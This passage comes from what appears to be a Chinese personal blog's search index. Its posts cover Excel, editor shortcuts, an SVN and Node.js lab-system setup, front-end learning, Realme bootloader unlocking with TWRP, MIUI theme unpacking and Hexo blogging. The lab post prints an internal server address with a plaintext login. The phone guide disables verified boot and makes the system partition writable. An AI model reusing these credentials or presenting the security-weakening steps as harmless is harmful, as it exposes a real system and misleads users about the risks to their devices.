工作流程是数据存储数据整理-数据分析-数据呈现2、一个工作簿默认最多能建255个工作表，内存大的可以更多3、一个工作表有1048576行、16384列”4、一个工作表约172亿个单元格，-个单元格能存放32767个字符5、鼠标三大状态:选择柄、移动柄、填充柄。双击填充柄快速填充需要临近列有数据。下一节我们将学习1.2 Excel规范制表之经典的三表结构\n","slug":"Excel数据整理与分析","date":"2020-11-10T12:52:48.000Z","categories_index":"课题,学习","tags_index":"Excel","author_index":"kif"},{"id":"690ddc4ee060a14d6a8188264c994543","title":"win编程常用快捷键","content":"常用快捷键\n\n\n一、 pycharm常用快捷键编辑类：\nCtrl + D 复制选定的区域或行Ctrl + Y 删除选定的行Ctrl + Alt + L 代码格式化Ctrl + Alt + O 优化导入（去掉用不到的包导入）Ctrl + 鼠标 简介&#x2F;进入代码定义Ctrl + &#x2F; 行注释 、取消注释\nCtrl + 左方括号 快速跳到代码开头Ctrl + 右方括号 快速跳到代码末尾Shift + F10 运行Shift + F9 调试\n查找&#x2F;替换类：\nCtrl + F 当前文件查找Ctrl + R 当前文件替换Ctrl + Shift + F 全局查找Ctrl + Shift + R 全局替换\n运行类：\nShift + F10 运行Shift + F9 调试Alt + Shift + F10 运行模式配置Alt + Shift + F9 调试模式配置\n调试类：\nF8 单步调试（一行一行走）F7 进入内部Shift + F8 退出Ctrl + F8 在当前行加上断点&#x2F;断点开关Ctrl + Shift + F8 查看所有断点\n导航类：\nCtrl + N 快速查找类（也可查找当前工程中的文件，以文件名查找）Double Shift 任意位置查找\n二、submit text3常用快捷键Ctrl+D 选词 （反复按快捷键，即可继续向下同时选中下一个相同的文本进行同时编辑）Ctrl+G 跳转到相应的行Ctrl+J 合并行（已选择需要合并的多行时）Ctrl+L 选择整行（按住-继续选择下行）Ctrl+M 光标移动至括号内开始或结束的位置Ctrl+T 词互换Ctrl+U 软撤销Ctrl+P 查找当前项目中的文件和快速搜索；输入 @ 查找文件主标题&#x2F;函数；或者输入 : 跳转到文件某行；Ctrl+R 快速列出&#x2F;跳转到某个函数Ctrl+K Backspace 从光标处删除至行首Ctrl+K+B 开启&#x2F;关闭侧边栏Ctrl+KK 从光标处删除至行尾Ctrl+K+T 折叠属性Ctrl+K+U 改为大写Ctrl+K+L 改为小写Ctrl+K+0 展开所有Ctrl+Enter 插入行后（快速换行）Ctrl+Tab 当前窗口中的标签页切换\nCtrl+Shift+A 选择光标位置父标签对儿Ctrl+Shift+D 复制光标所在整行，插入在该行之前ctrl+shift+F 在文件夹内查找，与普通编辑器不同的地方是sublime允许添加多个文件夹进行查找Ctrl+Shift+K 删除整行Ctrl+Shift+L 鼠标选中多行（按下快捷键），即可同时编辑这些行Ctrl+Shift+M 选择括号内的内容（按住-继续选择父括号）Ctrl+Shift+P 打开命令面板Ctrl+Shift+&#x2F; 注释已选择内容Ctrl+Shift+↑可以移动此行代码，与上行互换Ctrl+Shift+↓可以移动此行代码，与下行互换Ctrl+Shift+[ 折叠代码Ctrl+Shift+] 展开代码Ctrl+Shift+Enter 光标前插入行\nCtrl+PageDown 、Ctrl+PageUp 文件按开启的前后顺序切换\nCtrl+Z 撤销Ctrl+Y 恢复撤销Ctrl+F2 设置&#x2F;取消书签Ctrl+&#x2F; 注释整行（如已选择内容，同“Ctrl+Shift+&#x2F;”效果）Ctrl+鼠标左键 可以同时选择要编辑的多处文本\nShift+鼠标右键（或使用鼠标中键）可以用鼠标进行竖向多行选择Shift+F2 上一个书签Shift+Tab 去除缩进Alt+Shift+1（非小键盘）窗口分屏，恢复默认1屏Alt+Shift+2 左右分屏-2列Alt+Shift+3 左右分屏-3列Alt+Shift+4 左右分屏-4列Alt+Shift+5 等分4屏Alt+Shift+8 垂直分屏-2屏Alt+Shift+9 垂直分屏-3屏\nCtrl+Shift+分屏序号 将当前焦点页分配到分屏序号页\nAlt+. 闭合当前标签Alt+F3 选中文本按下快捷键，即可一次性选择全部的相同文本进行同时编辑\nTab 缩进 自动完成F2 下一个书签F6 检测语法错误F9 行排序(按a-z)F11 全屏模式\n","slug":"pycharm 常用快捷键","date":"2020-11-10T12:52:00.000Z","categories_index":"课题,学习","tags_index":"C.S.N","author_index":"kif"},{"id":"f3e0a712e66a8c7a4ee02570a25f31e5","title":"CSN实验室管理系统本地配置","content":"SVN使用软件下载：1．TortoiseSVN-1.9.6.27867-x64-svn-1.9.6.msi（svn客户端）\n软件下载地址：http://subversion.apache.org/packages.html\n打开网页拉到最后，看到以下的软件下载下来\n\n2．LanguagePack_1.9.6.27867-x64-zh_CN.msi（TortoiseSVN 的汉化包）\n接下来是TortoiseSVN汉化包，跟TortoiseSVN同一个页面要点击https://tortoisesvn.net/downloads.html\n\n安装：好了，接下来是具体的安装过程，安装顺序是\n1．TortoiseSVN-1.9.6.27867-x64-svn-1.9.6.msi（svn客户端）\n这个比较简单，一直next 就行\n安装之后如果在电脑文件空白处右击，出现以下情况就是安装成功\n\n2．LanguagePack_1.9.6.27867-x64-zh_CN.msi（TortoiseSVN 的汉化包）\n\n\n\n\n以上svn客户端安装完成并且汉化成功\n链接至CSN服务器本地仓库对应远程仓库即SVN服务器，本地仓库就是用于存放各种文档、程序的一个文件夹，在自己或别人编辑完后可通过SVN更新操作把最新版本的文件下载到本地仓库，或者通过SVN提交操作把自己的更改推送到服务器以方便他人获取（SVN更新、提交操作下文会有详细的介绍）。\n适当文件目录下新建一文件夹（以Test为例）\n\n在新建本地仓库后需要右键该文件夹选择“SVN 检出”并在弹出的对话框中输入远程仓库地址以绑定SVN服务器（比如：远程仓库\nhttps://172.22.9.219:8443/svn/csn\n），然后点击确定，再在弹出登录框中，输入自己 的SVN账号、密码即可。\n为项目开发环境修改为 https:&#x2F;&#x2F;172.22.9.219:8443&#x2F;svn&#x2F;csn\n用户名 20lczu\n密码   20lczu\n\n\n\n\n\n输入账号和密码后会开始下载\n\n目录结构：\n\n.svn是配置文件，一般不做改动\ncsn_lab_web是项目前端文件\ncsn-lab-manage-system是项目后端文件\n修改文件后在Test根目录下提交\n（20级同学没有修改提交权限）\n\n\n另一个用户在check后就可以看到改动的文档有红色标记（无标记的重启一次）\n\n前端配置Node.js 安装配置向大家介绍在 Windows 上安装 Node.js 的方法。\n本安装教程以 Node.js v4.4.3 LTS(长期支持版本)版本为例。\nNode.js 安装包及源码下载地址为：https://nodejs.org/en/download/。\n你可以根据不同平台系统选择你需要的 Node.js 安装包。\nNode.js 历史版本下载地址：https://nodejs.org/dist/\n本文实例以 v0.10.26 版本为例，其他版本类似， 安装步骤：\n步骤 1 : 双击下载后的安装包 v0.10.26，如下所示\n\n步骤 2 : 点击以上的Run(运行)\n步骤 3 : 勾选接受协议选项，点击 next（下一步） 按钮 :\n步骤 4 : Node.js默认安装目录为 “C:\\Program Files\\nodejs&quot; , 你可以修改目录，并点击 next（下一步）：\n步骤 5 : 点击树形图标来选择你需要的安装模式 , 然后点击下一步 next（下一步）\n步骤 6 :点击 Install（安装） 开始安装Node.js。你也可以点击 Back（返回）来修改先前的配置。 然后并点击 next（下一步）：\n\n安装过程：\n\n点击 Finish（完成）按钮退出安装向导。\n检测PATH环境变量是否配置了Node.js，点击win+R 输入”cmd” &#x3D;&gt; 输入命令”path”，输出如下结果：\nPATH&#x3D;C:\\oraclexe\\app\\oracle\\product\\10.2.0\\server\\bin;C:\\Windows\\system32;\nC:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;\nc:\\python32\\python;C:\\MinGW\\bin;C:\\Program Files\\GTK2-Runtime\\lib;\nC:\\Program Files\\MySQL\\MySQL Server 5.5\\bin;\nC:\\Program Files\\nodejs\\;\nC:\\Users\\rg\\AppData\\Roaming\\npm\n\n我们可以看到环境变量中已经包含了C:\\Program Files\\nodejs\\\n检查Node.js版本\n\n前端运行打开用svn下载的前端文件\n打开文件\n\n路径栏输入 cmd在当前目录下打开cmd\n输入代码：\nnpm run dev\n\n访问图中链接即可\n\n目前功能界面：\n\n\n​        \n​        \n        \n","slug":"CSN实验室管理系统本地配置","date":"2020-11-10T07:16:00.000Z","categories_index":"教程","tags_index":"CSN","author_index":"kif"},{"id":"115f4267185a040b65ee93e93091e717","title":"CSN实验室管理系统kif组指南","content":"前端开发工具：Hbuilder X\n[https://www.dcloud.io/hbuilderx.html]:\n编辑界面：\n前端开发是做什么的？老实说，这问题我倾向于复制粘贴网上答案来应付了事。可想想逢年过节时，亲朋好友们百分百会问到这个问题，我就说一下吧。\n敷衍的A：“做网站，搞网页开发的”。\n偏科的B：“做UI设计的，做微信公众号的”。\n装逼的C：“改变世界的”。\n认真的D：“前端开发有许多方向，比如网站重构，UI设计，web应用开发，物联前端，前端AR…(省略一千字)”。\n兼容性最强的万能答案：“写代码的，对，就是传说中的程序员！坐办公室用电脑的！”。\n.前端开发有钱途吗？当然有，做啥没前途？乞讨乞到极致，也能乞成千万富翁。\n一般来说，刚入门的新人，工资都高不到哪儿去，从1k到1w都有。注意，是刚入门，不是刚入行！管理层以下，绝大多数情况都是技术实力正比于薪资！\n互联网发达地区的薪资水平会高一截，如北京上海深圳广州杭州，互联网公司会比其他行业公司的薪资水平高一截。同等能力下，牛逼的小公司比大公司的薪资要高一点。\n前端有三大基础JavaScript、CSS、HTML。光HTML就不是上述方法能掌握的，更遑论JavaScript？JavaScript是门直译型的语言，是面向对象的。对象是啥，一只喵星人一个手机一个你就是一个对象。当然，JavaScript里的对象是代码组成的，而在JavaScript里，几乎一切都是对象。\n但凡是对象，那肯定是复杂的。你复杂吗？为什么复杂？对象的复杂性，很大程度取决于它自身与其依赖的周围环境。人在陆地上可以活得好好的，扔进水里，能活几分钟？水陆环境的不同，增加了人的复杂些。换成你手机也一样，把它丢进火里或水里试试。\n这跟JavaScript有什么关系？\n没关系。\n才怪。JavaScript是脚本语言，是条寄生虫，不寄生在宿主身上就没生命力的东西。它的宿主是什么？浏览器 or Node。\n本质上，浏览器和Node都给JavaScript提供了运行时的环境，所以，这个东西，才是JavaScript的幕后老板。我们称之为JavaScript Interpreter，当然，不止这么一种叫法，还有什么Redering Engine等等，总之，它们都可以将JavaScript代码翻译成机器码，供计算机认识与使用。\n没有灵魂的人，跟死人没什么两样。\nJavaScript被翻译成机器码后，就有了灵魂，活过来了。\n你看，JavaScript其实也是个对象。这么复杂的东西，光看书看视频听人说，能真正懂它吗？不能。这些行为最多帮我们知道它，了解它的知识体系与底层原理，顺便拓展一下眼界。要真正懂它，得不断地去使用它，以各种方式去使用它。\n就像你跟一个姑娘谈恋爱，光看照片看她日志有什么用，你要牵她的手，亲吻她，拥抱她，爱她，跟她交流，做各种羞羞的事，才会真正懂她。不是么？\nJavaScript尚且如此，包含它的整个前端还用说吗？\nJust do it！\n从哪里开始前端的第一步？废话了一堆，来点干货。首先，回答问题前，我们来趟时空旅行。\n1993年，超文本标记语言HTML（Hyper Text Markup Language）第一版面世，它只支持超链接的纯文本html文档。纯到什么地步？纯文本！超链接！没了。\n纯文本是什么概念？在你的电脑桌面新建一个txt文档，在里面写上\nhello world保存文档为html类型。然后双击打开它，你就可以在浏览器里看到hello world了！\n这就是纯文本html文档，纯的不能再纯的一个网页。\n超链接呢？以记事本方式打开刚才的文档，把hello world替换成\n&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;hello world&lt;&#x2F;a&gt;\n\n保存。双击打开这文档，你会在浏览器里看到带下划线的hello world，点击它，如果你能上网，那么毫无疑问，它会跳转到百度的首页。这么一个简单的文档，居然可以链接到百度，神奇吗？这就是超链接。链接互联网上的所有。\n时间往前走。\n1994年，层叠样式表CSS（Cascading Style Sheets）问世，这时它还没成为标准，直到1996才有第一版标准。CSS做了什么？回答这个问题得先知道HTML干了什么。HTML定义了文档的类型与内容。CSS，则决定了这些内容该如何展现。如果把HTML文档比喻成一幅纸画，那么CSS就是造物主的神力，它可以让纸画上的猫咪隐身，也可以让纸画上的鲜花变换颜色，甚至能让里面的小鸟飞出来，让高山变成平地，让沧海变成桑田。梦幻吧。\n打开刚才的文档，把内容替换成\n&lt;a href=&quot;http://www.baidu.com&quot; style=&quot;color: red&quot;&gt;hello world&lt;/a&gt;保存。双击打开它，你会在浏览器里看到红色的hello world。这里，style引入了CSS样式，color给这些文字打开了颜色的大门，red，涌入了进来，把它们染成了红色。\n1996年，JavaScript第一版诞生。只有HTML与CSS的世界太单调，鸟会飞，却无法互相交流，猫咪看不到老鼠，老鼠也看不到猫，它们过着孤独的生活。这样的世界不真实，于是，JavaScript来了。JavaScript赋予了这些生命思考、感知与交流的能力，从此这世界变得无比精彩，无数文明诞生与消亡，演绎宇宙洪荒。\n再次打开我们的文档，把内容替换成\n&lt;a href=&quot;http://www.baidu.com&quot; style=&quot;color: red&quot;&gt;hello world&lt;/a&gt;\n&lt;script&gt;\nalert(&#39;ni hao&#39;);\n&lt;&#x2F;script&gt;\n\n保存。双击打开它，你会在浏览器里看到一个弹出的提示框，上面写着，ni hao。这里，script引入了JavaScript代码，alert表示弹出一个提示框，括号里的是提示的内容。没错，人类，你被浏览器发现了！它在向你打招呼！\n好了。\n回到开始的问题上来，在哪开始前端的第一步？\n如果你刚才跟着我敲了一遍例子，那么你已经踏出了第一步。接下来的学习，是把HTML，CSS，JavaScript的所有基础知识快速泛读一遍（不求甚解，只求心中有个印象，大概知道都有些什么知识，真正要了解那些知识，应该放在后面的实践中学习，如此，效率极高），你可以在W3C或者菜鸟上面翻阅这些资料，或者在MND里阅读更详细的内容。相信MDN以后会是你经常光顾的一个地方，它就像前端的百科全书，网络图书馆，你想要的了解的，基本都能在里找到。\n这个过程，集中精力不受干扰，可能需要花费大约2~3个小时的时间。\n菜鸟教程https://www.runoob.com/\n主要学习板块，Js涉及到逻辑方面\n菜鸟教程提供了在线编程环境，可以在这里面运行代码\n项目开发中需要哪一部分就来找哪一部分的内容\n快速入门B站教程（仅供参考，可以去网站上搜索适合自己的视频教程）\nhttps://www.bilibili.com/video/BV1ds411r7o7?from=search&amp;seid=15360288197946478063\nH5C3+移动布局 https://www.bilibili.com/video/BV14J4114768JavaScript系列 https://www.bilibili.com/video/BV1Sy4y1C7ha在线考试方案https://www.freecodecamp.org/learn\n点击开始注册\n选择喜欢的方式登录，有github 账号的用github账号，无的用Email登录，qq邮箱都可以\n然后登录qq邮箱输入验证码\n注册成功后登陆\n界面是全英文界面，题目看不懂的可以用百度翻译\nfreecodecamp首页freecodecamp首页一下的推荐大家用来练手\n好吧？？？？？\n写完前面的时候我又找到了这个网站的中文社区\nhttps://www.freecodecamp.one/\n就在这个中文的社区做吧\n","slug":"CSN实验室管理系统kif组指南","date":"2020-10-23T07:21:00.000Z","categories_index":"教程","tags_index":"CSN","author_index":"kif"},{"id":"110236f232ea68dd25cfd299f10b7734","title":"玩机汇总（五）：第三方刷机教程","content":"刷第三方ROM教程1.解锁BL(已解锁可忽视)解锁工具https://www.lanzous.com/i5oszda(解锁会删除数据,自己记得备份)\n准备工作，一台驱动正常的电脑，正常完整的数据线，一台拥有解锁资格的realme手机\n1.打开深度测试APP，点击进入深度测试（fastboot）此时手机进入fastboot\n2.下载好adb工具包，并且找到对应手机型号的twrp。\n2.给twrp的img镜像和vbmeta.img（8kb大小）放入adb工具包。\n3.给twrp重命名为（ twrp.img ）。\n4.插上数据线连接好手机，打开adb工具包，打开cmd here.exe命令窗口\n5.复制命令fastboot flashing unlock到命令窗口\n如果手机出现反应询问是否解锁，用音量键选择到第二个UNLOCK THE BOOTLOADER，电源键确认\n\n然后手机自动格式化data分区，然后静静等待开机，选择语言\n   到此bl解锁完成\n如果没有输入命令手机无反应，应该是以下两个问题\n1.驱动问题（比较常见）\n 解决办法：自行下载驱动，没有驱动搞什么机（手动滑稽）\n2.usb接口\n 解决办法：\n1.usb接口分为usb2.0 usb3.0更换usb接口即可解决\n2.如果所有usb接口都试过仍然无法解决，可以给中间转接一下。淘宝上很多转接头\n教程适用于所有realme手机\n如果成功就接着往下看吧\n2.进入fastboot模式使用电脑adb输入指令fastboot flashing unlock(不行下这个https://www.lanzous.com/i5ovblc)\nFASTBOOT如果没有自带怎么打开?部分电脑可以直接在cmd输入以下指令cd J:\\Phone\\OPPO RealmeX标准版一键刷recovery工具不行的去下载刷机软件或者找有cmd的fastboot刷机压缩包\n3.刷入第三方recovery,TWRP刷入VB1.接着上一步，\n2.拔掉数据线关闭命令窗口\n3.手机进入fastboot，然后插好数据线，再次打开命令窗口\n4.复制命令fastboot –disable-verity –disable-verification flash vbmeta vbmeta.img到命令窗口，回车键确认，不要自做聪明删掉中间的空格符号等，请完整复制粘贴\n 到此VB刷入成功\n然后接着向下看\n刷入twrp1.刷入VB成功后，不要开机，不要关闭命令窗口，不要拔掉数据线\n2.复制fastboot flash recovery twrp.img粘贴到命令窗口（请完整复制）\n手机按音量减，上面的绿色文字START变成红色文字recovery mode这时按电源键确认。手机会重启到twrp\n如果仍然为官方recovery请你检查你的手机与电脑连接是否正常，或者之前刷入过twrp\n1.进入twrp后会弹出键盘，这时解密data分区，输入锁屏密码即可\n2.解密成功后下一个界面直接滑动下面的滑块，不需要管上面的文字，因为我说了你也不一定懂（滑稽）直接滑动滑块就行了，到这个界面。\n\n到此twrp刷入成功\n4.进行四清以TWRP为例,把Dalvik.system.data.cache打钩,清除(如果刷完重启一直进rec或者一直重启，现在可以把能在rec的清除选项把能清的都清了)注:部分电脑在手机清除完数据无法打开手机目录,只需重启手机即可解决问题如果进rec没有自动帮你挂载文件,自己去挂载挂载第1,2个即可\n把自己要刷的rom放进手机储存即可进行刷机\n 开机有谷歌验证的话 重启到recovery模式,清除cache和Dalvik,重启即可\n\n想解锁system分区有解锁不了1.直接解决办法,刷机2.不一定在一些软件可用的解锁办法→1.root后打开mt管理器2.选择system文件夹,按住会有属性,点击,在权限那行点击更改3.把用户组的写打钩,点击确定即可\n可以使用syslock查看system分区是否解锁\n不推荐新手线刷教程:例:群文件MIUI11包一秒刷完1.解压刷机包2.把里面的system.img vendor.img boot.img 复制到fastboot工具文件夹3.确保手机与电脑的连接,输入以下指令fastboot flash vendor vendor.imgfastboot flash system system.imgfastboot flash boot boot.img完成后即可重启\n\n","slug":"玩机汇总（五）：第三方刷机教程","date":"2020-08-14T16:00:00.000Z","categories_index":"教程","tags_index":"玩机","author_index":"kif"},{"id":"7f17cc3702b49e8885b9f8501a52d936","title":"玩机汇总（六）：MIUI主题拆包","content":"开始教程（电脑）：\n一：总概括1. 主题包大概所包含常用的模块：如下图：\n\n2. 常用模块介绍：（1）.boots文件夹—开机动画。\n（2）.fonts文件夹—字体。\n（3）.preview文件夹—该主题的截图介绍。\n（4）.wallpaper文件夹—锁屏壁纸和桌面壁纸。\n（5）.clock_2*4模块—桌面时间样式。\n（6）.com.android.contacts模块—拨号键盘样式。\n（7）.com.android.mms模块—短信界面（气泡、字体颜色等）。\n（8）.com.android.settings模块—设置（自定义设置名字、设置内容图标等）。\n（9）.com.android.systemui模块—状态栏（背景、开关图标、自定义电池后文字、纵横排开关个数，自定义信号、WIFI、电池、蓝牙、静音、闹钟等图标）。\n（10）.com.android.thememanger模块—主题中心（自定义主题商店的名字、背景、修改导入本地主题按钮名称等）。\n（11）.com.android.updater模块—系统升级（系统更新背景图、自定义更新按钮名字等）。\n（12）.com.miui.home模块—桌面布局（修改图标布局、图标大小等）。\n（13）.com.android.securitycenter模块—安全中心（背景图）。\n（14）.com.android.touchassistant模块—悬浮球（自定义悬浮球样式、颜色）。\n（15）.com.tencent.mobileqq模块—默认QQ主题（修改QQ默认主题样式）。\n（16）. description.xml****模块—主题信息（设计师名字、主题名字、主题介绍）。\n（17）. framework-miui-res模块—全局背景（设置背景，短信背景、音量图、搜索栏背景图等）。\n（18）.icons模块—图标\n（19）. Lockscreen****模块—锁屏样式\n3.所需工具：（1）.打开MTZ主题包工具：WINR压缩或者360压缩（选择MTZ文件右键选择压缩打开，里面的模块则用ctrl+enter组合键打开）。注：我用的360压缩！！！\n*（2）.XML代码修改工具：***notepad++**（百度搜索下载）。\n\n（3）.图片编辑器：PS或者其他（光影魔术手）。\n*（4）.点九图软件：***Nine-PatchEditor\n小技巧：****手机应用你需要修改的主题，电脑或手机打开主题文件对应着看！\n二．模块详细修改介绍（想替换的素材直接复制粘贴进主题包对应位置替换即可！名称或图片格式或大小相同即可。）\n（1）. boots文件夹—开机动画，如图：（都是用很多张图片组成开机动画）\n\n附上网上开机动画制作教程（教程仅供参考）：http://www.miui.com/thread-571473-1-1.html\nhttp://www.xiaomi.cn/content-20-6690-1.html\n（2）. fonts文件夹—字体（打开后字体为ttf格式）\n\n（3）. preview文件夹—该主题的截图（格式：png）介绍，如图：\n\n注：这只是随意的主题介绍图，主题商店的主题介绍图，名称都是对应的，区别请自己下载主题商店的主题拆包研究！\n（4）. wallpaper文件夹—锁屏壁纸和桌面壁纸（格式：jpg）\n\n（5）. clock_2*4模块—桌面时间样式（一般没什么可以改的，有好看的时钟样式，直接替换就行）\n\n（6）. com.android.contacts模块—拨号键盘样式\n\n注：拨号键盘背景图名称：dialer_background.9.png&#x2F; dialer_bottom_bar_bg.9.png\n\n（7）.com.android.mms模块—短信界面（气泡、字体颜色等）\n\n（8）.com.android.settings模块—设置（自定义设置名字、设置内容图标等）\n\n\n（9）. com.android.systemui模块—状态栏（背景、开关图标、自定义电池后文字、纵横排开关个数，自定义信号、WIFI、电池、蓝牙、静音、闹钟等图标）\n信号，WiFi，电池等通知图标所在文件夹：\n\n状态栏全背景图名字：notification_panel_bg.png\n状态栏半背景图名字：notification_list_bg.9.png\n清理背景图名字：recent_task_bg.9.png\n注：需要修改的内容直接复制粘贴进去替换就行！\n\n\n（10）.com.android.thememanger模块—主题中心（自定义主题商店的名字、背景、修改导入本地主题按钮名称等）\n\n背景图名字：theme_window_background.9.png\n\n（11）.com.android.updater模块—系统升级（系统更新背景图、自定义更新按钮名字等）。\n\n\n（12）.com.miui.home模块—桌面布局（修改图标布局、图标大小等）\n\n\n\n（13）.com.android.securitycenter模块—安全中心（背景图）。\n\n\n（14）.com.android.touchassistant模块—悬浮球（自定义悬浮球样式、颜色）。\n\n\n\n附上颜色代码查询表：http://yusi123.com/1090.html\n（16）. description.xml****模块—主题信息（设计师名字、主题名字、主题介绍）。\n\n（17）. framework-miui-res模块—全局背景（设置背景，短信背景、音量图、搜索栏背景图等）。\n\n\n\n（18）.icons模块—图标\n\n（19）. Lockscreen****模块—锁屏样式\n注：这个没什么好说的，好看的锁屏直接替换！！！\n​               \n来自：\n小米主题框架交流群：【Ⅰ群：534025609、Ⅱ群：107086533】\n  **—Mr.**阿傑！\n","slug":"玩机汇总（六）：MIUI主题拆包","date":"2020-08-14T16:00:00.000Z","categories_index":"教程","tags_index":"MIUI","author_index":"kif"},{"id":"43feae960527b3100301e38f916d74e2","title":"个人博客搭建（1）：Hexo搭建个人博客部署到Github","content":"本文介绍Hexo搭建个人博客部署到Github\n Hexo 是一个轻量、快速，简单和强大的博客框架，当我们需要发布博文的时候，只需要将写好的文章（MarkDown文件）放入本地的 \\source\\_posts 文件夹，然后再推送上去就行了，原理就是当我们在执行 hexo g 命令时，.md 文件就会被转化成 HTML 文件，\n\n安装Hexo利用 npm 命令即可安装。在任意位置点击鼠标右键，选择Git Bash\n输入命令：`npm install -g hexo\n\n`\n\n-g是指全局安装hexo。\n注：如果被”墙“，可使用淘宝 NPM 镜像\n`\n$ npm install -g cnpm --registry=https://registry.npm.taobao.org\n\n`\n\n使用淘宝NPM安装Hexo\n`\n$ cnpm install -g hexo-cli\n\n`\n\n与原先的npm完全一样，只是命令改为cnpm,一样等待hexo安装完成出现的WARN可以不用理会继续输入以下命令\n`\n$ cnpm install hexo --save\n\n`\n\n检验`\n$ hexo -v\n\n`\n\n初始化Hexo创建文件夹\n在Hexo文件下，右键运行Git Bash，输入命令：`\nhexo init\n`\n\n\n\n在_config.yml,进行基础配置    这里只列举了部分，其他可以根据自己要求更改\n主题主题下载\n可以选择更多主题，然后在Hexo文件夹下 Git Bash\n`\ngit clone https://github.com/iissnan/hexo-theme-nextthemes/next\n\n（next为主题名字），来获得更多主题\n\n`\n\n并在_config.yml中更改\n\n本地浏览博客  分别输入 如下命令：\n`\nhexo g\n hexo s\n\n`\n\n更多命令\n\n在浏览器输入：localhost：4000 ，就可以进行访问\n写文章在我们放置博客文件的文件夹Hexo中，source&#x2F;_posts&#x2F;目录下存放着所有博文的Markdown文件，初始化只有一个hello-world.md文件。我们可以在Git Bash中创建新博文：\n`\nhexo new &lt;title&gt;\n\n`\n\n在_posts目录下会生成相应的.md文件，接下来我们可以编辑该文件，直接写博文。（注意使用Markdown语法）\n文章中头部内容\n`\ntitle: typora-vue-theme主题介绍\ndate: 2018-09-07 09:25:00\nauthor: kif\nimg: /source/images/xxx.jpg\ntop: true\ncover: true\ncoverImg: /images/1.jpg\npassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\ntoc: false\nmathjax: false\nsummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\ncategories: Markdown\ntags:\n  - Typora\n  - Markdown\n---\n\nitle    Markdown 的文件标题    文章标题，强烈建议填写此选项\ndate    文件创建时的日期时间    发布时间，强烈建议填写此选项，且最好保证全局唯一\nauthor    根 _config.yml 中的 author    文章作者\nimg    featureImages 中的某个值    文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: http://xxx.com/xxx.jpg\ntop    true    推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章\ncover    false    v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中\ncoverImg    无    v1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片\npassword    无    文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项\ntoc    true    是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项\nmathjax    false    是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行\nsummary    无    文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\ncategories    无    文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类\ntags    无    文章标签，一篇文章可以多个标签\nkeywords    文章标题    文章关键字，SEO 时需要\nreprintPolicy    cc_by    文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个\n\n\n\n写完博文后，执行即可在博客中更新。\n\nhexo g\nhexo d\n\n如果要删除博文，则直接把_posts目录下相应的.md文件删除，再执行上述命令即可。\nPS：关于在博文中插入图片\n可以把图片统一放置在source/images目录下，然后在使用时用下述方式引用。\n\n\n![](/images/image.jpg)\n\n`\n\n部署到Github上申请Github账号new repository\n然后点击  Create repository\n在_config.yml进行配置\n仓库地址\n安装hexo-deployer-git自动部署发布工具`\nnpm install hexo-deployer-git  --save\n`\n\n发布到Github`hexo c\nhexo g\nhexo d","slug":"个人博客搭建（1）：Hexo搭建个人博客部署到Github","date":"2020-08-13T16:00:00.000Z","categories_index":"教程","tags_index":"hexo","author_index":"kif"},{"id":"1858b1eafe78a3531b036c6b0c5436c0","title":"个人博客搭建（4）：matery 主题调教（持续更新...）","content":"介绍：项目地址：hexo-theme-matery\n是一个采用 Material Design 和响应式设计的 Hexo 博客主题。\n主页：\n\n\n下载：当你看到这里的时候，应该已经有一个自己的 Hexo 博客了。如果还没有的话，不妨使用 Hexo 和 Markdown 来写博客和文章。\n点击 这里 下载 master 分支的最新稳定版的代码，解压缩后，将 hexo-theme-matery 的文件夹复制到你 Hexo 的 themes 文件夹中即可。\n当然你也可以在你的 themes 文件夹下使用 Git clone 命令来下载:\ngit clone https://github.com/blinkfox/hexo-theme-matery.git`&lt;/pre&gt;\n\n会得到如下文件\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814190654.png)\n\n# [](#配置 &quot;配置&quot;)配置\n\n## [](#切换 &quot;切换&quot;)切换\n\n修改 Hexo **根目录下的 `_config.yml`** （注意区分更目录下的config和主题文件下的config）的 `theme` 的值：`theme: hexo-theme-matery`\n\n（如果你重命名下载的文件的话就改为重命名后的名字，此教程已重命名为matery）\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814190510.png)\n\n## [](#新建分类-categories-页 &quot;新建分类 categories 页&quot;)新建分类 categories 页\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210041.png)\n\ncategories即主页顶部”分类：点击所要跳转的页面\n\n`categories` 页是用来展示所有分类的页面，如果在你的博客 `source` 目录下还没有 `categories/index.md` 文件，那么你就需要新建一个，命令如下：\n\n&lt;pre&gt;`hexo new page &quot;categories&quot;`&lt;/pre&gt;\n\n编辑你刚刚新建的页面文件 `/source/categories/index.md`，写入以下内容：\n\n&lt;pre&gt;`---\ntitle: categories\ndate: 2018-09-30 17:25:30\ntype: &quot;categories&quot;\nlayout: &quot;categories&quot;\n---`&lt;/pre&gt;\n\n## [](#新建标签-tags-页 &quot;新建标签 tags 页&quot;)新建标签 tags 页\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210005.png)\n\n`about` 页是用来展示**关于我和我的博客**信息的页面，如果在你的博客 `source` 目录下还没有 `about/index.md` 文件，那么你就需要新建一个，命令如下：\n\n&lt;pre&gt;`hexo new page &quot;about&quot;`&lt;/pre&gt;\n\n编辑你刚刚新建的页面文件 